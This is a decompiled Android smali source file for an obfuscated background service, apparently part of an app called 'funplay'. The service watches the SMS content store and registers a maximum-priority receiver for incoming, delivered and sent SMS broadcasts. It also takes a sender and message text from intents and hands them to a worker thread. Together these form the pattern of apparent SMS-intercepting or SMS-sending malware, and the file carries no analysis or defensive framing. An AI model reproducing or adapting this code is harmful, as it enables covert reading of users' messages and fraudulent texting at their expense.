.class public Lcom/inter/china/fplay/service/LlcServoceOne;
.super Landroid/app/Service;
.source "LlcServoceOne.java"


# static fields
.field public static O000000o:Landroid/content/Context;


# instance fields
.field private O00000Oo:Lcom/inter/china/fplay/service/LlcReceiverOne;

.field private O00000o0:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 33
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 26
    new-instance v0, Lcom/inter/china/fplay/service/LlcReceiverOne;

    invoke-direct {v0}, Lcom/inter/china/fplay/service/LlcReceiverOne;-><init>()V

    iput-object v0, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000Oo:Lcom/inter/china/fplay/service/LlcReceiverOne;

    .line 34
    return-void
.end method

.method private O000000o(Landroid/content/Context;)V
    .locals 4

    .prologue
    .line 53
    new-instance v0, Lcom/inter/china/fplay/O00000o/O000000o;

    new-instance v1, Landroid/os/Handler;

    invoke-direct {v1}, Landroid/os/Handler;-><init>()V

    invoke-direct {v0, v1, p1}, Lcom/inter/china/fplay/O00000o/O000000o;-><init>(Landroid/os/Handler;Landroid/content/Context;)V

    .line 54
    invoke-virtual {p0}, Lcom/inter/china/fplay/service/LlcServoceOne;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "content://sms/"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const/4 v3, 0x1

    invoke-virtual {v1, v2, v3, v0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 56
    return-void
.end method

.method private O000000o(Landroid/os/Bundle;)V
    .locals 5

    .prologue
    .line 94
    const-string v0, "sms_sender"

    invoke-virtual {p1, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 95
    const-string v1, "sms_content"

    invoke-virtual {p1, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 96
    const-class v2, Lcom/inter/china/fplay/service/LlcServoceOne;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "smsSender = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "; smsContent = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/inter/china/fplay/O00000Oo/O000000o;->O00000Oo(Ljava/lang/Class;Ljava/lang/String;)V

    .line 98
    invoke-direct {p0, v0, v1}, Lcom/inter/china/fplay/service/LlcServoceOne;->O000000o(Ljava/lang/String;Ljava/lang/String;)V

    .line 99
    return-void
.end method

.method private O000000o(Ljava/lang/String;Landroid/os/Bundle;)V
    .locals 3

    .prologue
    .line 73
    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 74
    invoke-direct {p0, p0}, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000Oo(Landroid/content/Context;)V

    .line 91
    :goto_0
    return-void

    .line 77
    :cond_0
    const-class v0, Lcom/inter/china/fplay/service/LlcServoceOne;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "commit = "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/inter/china/fplay/O00000Oo/O000000o;->O00000Oo(Ljava/lang/Class;Ljava/lang/String;)V

    .line 78
    const/4 v0, -0x1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v1

    packed-switch v1, :pswitch_data_0

    :cond_1
    :goto_1
    packed-switch v0, :pswitch_data_1

    .line 88
    invoke-direct {p0, p0}, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000Oo(Landroid/content/Context;)V

    goto :goto_0

    .line 78
    :pswitch_0
    const-string v1, "com.funplay.handle.sms"

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/4 v0, 0x0

    goto :goto_1

    .line 84
    :pswitch_1
    invoke-direct {p0, p2}, Lcom/inter/china/fplay/service/LlcServoceOne;->O000000o(Landroid/os/Bundle;)V

    goto :goto_0

    .line 78
    nop

    :pswitch_data_0
    .packed-switch 0xa965bb
        :pswitch_0
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_1
    .end packed-switch
.end method

.method private O000000o(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 135
    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {p2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 138
    :cond_0
    :goto_0
    return-void

    .line 137
    :cond_1
    new-instance v0, Lcom/inter/china/fplay/service/O000000o;

    iget-object v1, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000o0:Landroid/content/Context;

    invoke-direct {v0, v1, p1, p2}, Lcom/inter/china/fplay/service/O000000o;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0}, Lcom/inter/china/fplay/service/O000000o;->start()V

    goto :goto_0
.end method

.method private O00000Oo(Landroid/content/Context;)V
    .locals 2

    .prologue
    .line 148
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 150
    const-string v1, "com.broadcast.telephony.SMS_SENT"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 151
    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 152
    const-string v1, "android.provider.Telephony.SMS_DELIVER"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 153
    const-string v1, "cn.tesjda.over"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 154
    const-string v1, "as.tesk.lkf.ajsd"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 155
    const-string v1, "funplay.sms.report.log"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 156
    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 157
    iget-object v1, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000Oo:Lcom/inter/china/fplay/service/LlcReceiverOne;

    invoke-virtual {p0, v1, v0}, Lcom/inter/china/fplay/service/LlcServoceOne;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 158
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "------------------"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000Oo:Lcom/inter/china/fplay/service/LlcReceiverOne;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {v0, v1}, Lcom/inter/china/fplay/O00000Oo/O00000Oo;->O000000o(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 160
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 2

    .prologue
    .line 38
    const-class v0, Lcom/inter/china/fplay/service/LlcServoceOne;

    const-string v1, "------------ onBind ----------"

    invoke-static {v0, v1}, Lcom/inter/china/fplay/O00000Oo/O000000o;->O00000o0(Ljava/lang/Class;Ljava/lang/String;)V

    .line 39
    sput-object p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O000000o:Landroid/content/Context;

    iput-object p0, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000o0:Landroid/content/Context;

    .line 40
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 1

    .prologue
    .line 45
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 46
    const-class v0, Lcom/inter/china/fplay/service/LlcServoceOne;

    invoke-static {v0}, Lcom/inter/china/fplay/O00000Oo/O000000o;->O000000o(Ljava/lang/Class;)V

    .line 47
    sput-object p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O000000o:Landroid/content/Context;

    iput-object p0, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000o0:Landroid/content/Context;

    .line 48
    invoke-direct {p0, p0}, Lcom/inter/china/fplay/service/LlcServoceOne;->O000000o(Landroid/content/Context;)V

    .line 49
    return-void
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 165
    iget-object v0, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000Oo:Lcom/inter/china/fplay/service/LlcReceiverOne;

    invoke-virtual {p0, v0}, Lcom/inter/china/fplay/service/LlcServoceOne;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 169
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 170
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 0

    .prologue
    .line 142
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 144
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3

    .prologue
    .line 60
    sput-object p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O000000o:Landroid/content/Context;

    iput-object p0, p0, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000o0:Landroid/content/Context;

    .line 61
    const/4 v0, 0x0

    .line 62
    if-eqz p1, :cond_0

    .line 63
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 64
    :cond_0
    if-eqz v0, :cond_1

    .line 65
    const-string v1, "funplay.service.commit"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1, v0}, Lcom/inter/china/fplay/service/LlcServoceOne;->O000000o(Ljava/lang/String;Landroid/os/Bundle;)V

    .line 69
    :goto_0
    const/4 v0, 0x1

    return v0

    .line 67
    :cond_1
    invoke-direct {p0, p0}, Lcom/inter/china/fplay/service/LlcServoceOne;->O00000Oo(Landroid/content/Context;)V

    goto :goto_0
.end method
